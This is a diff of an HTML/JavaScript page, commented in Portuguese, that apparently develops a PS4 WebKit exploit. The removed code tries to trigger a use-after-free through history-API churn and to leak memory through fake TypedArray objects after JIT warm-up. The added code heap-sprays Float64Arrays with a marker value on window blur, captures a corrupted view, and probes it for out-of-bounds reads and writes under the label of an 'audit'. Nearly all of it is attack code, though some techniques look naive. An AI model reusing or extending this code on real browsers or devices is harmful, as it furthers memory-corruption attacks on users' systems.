@@ -1,171 +1,174 @@
 <!DOCTYPE html>
 <html>
-<head><title>Real OOB Test</title></head>
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit UAF → OOB Auditoria</title>
+<style>
+body { font-family: monospace; background: #000; color: #0f0; }
+button { margin: 5px; }
+.pass { color: #0f0; }
+.fail { color: #f00; }
+.warn { color: #ff0; }
+</style>
+</head>
+
 <body>
-<button onclick="test()">Test Real OOB</button>
+
+<h2>PS4 WebKit – Auditoria Real UAF → OOB</h2>
+
+<button onclick="setup()">1. SETUP UAF</button>
+<button onclick="runAudit()">2. RODAR AUDITORIA</button>
+
 <pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById("log");
-function log(m) { logEl.textContent += m + "\n"; }
+let g_arrays = [];
+let g_corrupted = null;
+let g_u8 = null;
+let triggerCount = 0;
+const PATTERN = 2.121995791e-314;
+const log = m => document.getElementById("log").textContent += m + "\n";
 
-const BASE = 977, STEP = 14461, UAF_ITERS = 48;
+function setup() {
+    log("== SETUP ==");
+    g_arrays = [];
+    g_corrupted = null;
+    triggerCount = 0;
 
-async function triggerUAF() {
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    history.pushState({index:i}, "", "#" + "E".repeat(size));
-    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    size += STEP;
-    await new Promise(r=>setTimeout(r,5));
-  }
-  await new Promise(r=>setTimeout(r,200));
+    for (let i = 0; i < 5000; i++) {
+        let a = new Float64Array(8);
+        a[0] = i;
+        g_arrays.push(a);
+    }
+
+    if (document.documentElement.webkitRequestFullscreen)
+        document.documentElement.webkitRequestFullscreen();
+
+    window.onblur = () => {
+        triggerCount++;
+        log("Trigger #" + triggerCount);
+
+        let spray = [];
+        for (let i = 0; i < 8000; i++) {
+            let s = new Float64Array(10);
+            s.fill(PATTERN);
+            spray.push(s);
+        }
+
+        for (let a of g_arrays) {
+            if (a[0] === PATTERN) {
+                g_corrupted = a;
+                g_u8 = new Uint8Array(a.buffer);
+                log("UAF CONFIRMADO – view capturada");
+                break;
+            }
+        }
+
+        if (!g_corrupted)
+            log("UAF NÃO detectado");
+    };
 }
 
-async function test() {
-  log("=== REAL OOB TEST ===\n");
-  
-  await triggerUAF();
-  
-  window.addEventListener('popstate', (e) => {
-    if(e.state && e.state.index >= 40) {
-      log("[RACE] Testing REAL OOB...\n");
-      
-      // CRITICAL: Criar REAL TypedArray primeiro
-      log("[1] Creating REAL Uint32Array with known pattern:");
-      const realArray = new Uint32Array(100);
-      for(let i=0; i<100; i++) {
-        realArray[i] = 0xAAAA0000 + i;
-      }
-      log("    Real array[0] = 0x" + realArray[0].toString(16));
-      log("    Real array[99] = 0x" + realArray[99].toString(16));
-      
-      // Criar marker object LOGO APÓS o array (esperando adjacência)
-      log("\n[2] Creating marker object (hoping for adjacency):");
-      const marker = {
-        signature: 0xDEADBEEF,
-        id: 12345,
-        flag: true
-      };
-      log("    marker.signature = 0x" + marker.signature.toString(16));
-      
-      // JIT function
-      function jit_access(arr, idx) {
-        return arr[idx];
-      }
-      
-      // Warm up com REAL array
-      log("\n[3] Warming JIT with REAL TypedArray:");
-      for(let i=0; i<10000; i++) {
-        jit_access(realArray, i % 100);
-      }
-      log("    JIT compiled");
-      
-      // AGORA: Criar fake que IMITA real TypedArray
-      log("\n[4] Creating fake TypedArray:");
-      
-      const fake = {
-        length: 0x10000,
-        byteLength: 0x40000,
-        byteOffset: 0,
-        BYTES_PER_ELEMENT: 4
-      };
-      
-      // Copiar estrutura de Uint32Array
-      Object.setPrototypeOf(fake, Uint32Array.prototype);
-      
-      log("    Fake created with Uint32Array prototype");
-      log("    Fake length: " + fake.length);
-      
-      // CRITICAL TEST: Ler VALORES NÃO INICIALIZADOS
-      log("\n[5] Reading UNINITIALIZED indices:\n");
-      
-      let foundData = false;
-      
-      for(let i=0; i<200; i++) {
-        try {
-          const val = jit_access(fake, i);
-          
-          // Se ler algo diferente de undefined/0, pode ser leak!
-          if(val !== undefined && val !== 0 && !isNaN(val)) {
-            log(`    [${i}] = 0x${val.toString(16).padStart(8,'0')}`);
-            foundData = true;
-            
-            // Check se é nosso marker
-            if(val === 0xDEADBEEF) {
-              log(`\n    🚨🚨🚨 FOUND MARKER! 🚨🚨🚨`);
-              log(`    🚨 INFO LEAK CONFIRMED! 🚨`);
-            }
-            
-            // Check se é do realArray
-            if((val & 0xFFFF0000) === 0xAAAA0000) {
-              log(`\n    🚨 LEAKED REAL ARRAY DATA! 🚨`);
-            }
-          }
-        } catch(err) {
-          log(`    [${i}] Exception: ${err.message}`);
-          break;
-        }
-      }
-      
-      if(!foundData) {
-        log("    No data leaked (all undefined/0)");
-      }
-      
-      // ALTERNATIVE: Tentar com backing store pointer
-      log("\n[6] Attempting buffer backing store confusion:\n");
-      
-      const buffer = new ArrayBuffer(256);
-      const view = new Uint32Array(buffer);
-      
-      for(let i=0; i<64; i++) {
-        view[i] = 0xBEEF0000 + i;
-      }
-      
-      log("    Real buffer created with pattern");
-      
-      // Criar fake view sem buffer
-      const fakeView = {
-        length: 1000,
-        buffer: buffer,  // Pointing to REAL buffer
-        byteLength: 4000,
-        byteOffset: 0,
-        BYTES_PER_ELEMENT: 4
-      };
-      Object.setPrototypeOf(fakeView, Uint32Array.prototype);
-      
-      // Warm up
-      for(let i=0; i<10000; i++) {
-        jit_access(view, i % 64);
-      }
-      
-      log("\n    Reading via fake view (pointing to real buffer):");
-      
-      for(let i=0; i<100; i++) {
-        try {
-          const val = jit_access(fakeView, i);
-          
-          if(val !== undefined && val !== 0) {
-            log(`      [${i}] = 0x${val.toString(16)}`);
-            
-            if(i >= 64) {
-              log(`        🚨 READ BEYOND REAL BUFFER! (size=64)`);
-            }
-          }
-        } catch(e) {
-          log(`      [${i}] ${e.message}`);
-          break;
-        }
-      }
+function runAudit() {
+    log("\n== AUDITORIA ==");
+    if (!g_corrupted) {
+        log("ERRO: rode o SETUP primeiro");
+        return;
     }
-  });
-  
-  for(let i=0; i<15; i++) {
-    history.back();
-    await new Promise(r=>setTimeout(r,40));
-  }
+
+    auditLengthInvariant();
+    auditIndexWrite();
+    auditSubarray();
+    auditCopyWithin();
+    auditIteration();
+    auditGCInfluence();
+
+    log("\n== FIM DA AUDITORIA ==");
+}
+
+/* ===================== TESTES ===================== */
+
+function auditLengthInvariant() {
+    log("\n[TESTE 1] Length invariável");
+    try {
+        if (g_corrupted.length !== 8)
+            log("FAIL: length alterado -> " + g_corrupted.length);
+        else
+            log("PASS: length = 8");
+    } catch (e) {
+        log("EXCEPTION: " + e);
+    }
+}
+
+function auditIndexWrite() {
+    log("\n[TESTE 2] Escrita fora do limite");
+    try {
+        g_corrupted[9] = 13.37;
+        if (g_corrupted[9] === 13.37)
+            log("FAIL: escrita fora do length funcionou");
+        else
+            log("PASS: RangeError ou ignorado");
+    } catch (e) {
+        log("PASS: exceção lançada");
+    }
+}
+
+function auditSubarray() {
+    log("\n[TESTE 3] subarray()");
+    try {
+        let s = g_corrupted.subarray(0, 32);
+        if (s.length > 8)
+            log("FAIL: subarray expandiu para " + s.length);
+        else
+            log("PASS: subarray limitado");
+    } catch (e) {
+        log("EXCEPTION: " + e);
+    }
+}
+
+function auditCopyWithin() {
+    log("\n[TESTE 4] copyWithin()");
+    try {
+        g_corrupted.copyWithin(0, 4, 20);
+        log("PASS: copyWithin não quebrou limites");
+    } catch (e) {
+        log("PASS: exceção segura");
+    }
+}
+
+function auditIteration() {
+    log("\n[TESTE 5] Iteração for..of");
+    try {
+        let count = 0;
+        for (let v of g_corrupted) count++;
+        if (count > 8)
+            log("FAIL: iterou além do length: " + count);
+        else
+            log("PASS: iteração normal (" + count + ")");
+    } catch (e) {
+        log("EXCEPTION: " + e);
+    }
+}
+
+function auditGCInfluence() {
+    log("\n[TESTE 6] Influência de GC / pressão de heap");
+
+    try {
+        let junk = [];
+        for (let i = 0; i < 20000; i++)
+            junk.push(new Float64Array(16));
+
+        let v = g_corrupted[16];
+        if (v !== undefined)
+            log("FAIL: leitura além do limite após GC");
+        else
+            log("PASS: GC não afetou limites");
+
+    } catch (e) {
+        log("EXCEPTION: " + e);
+    }
 }
 </script>
+
 </body>
-</html
+</html>
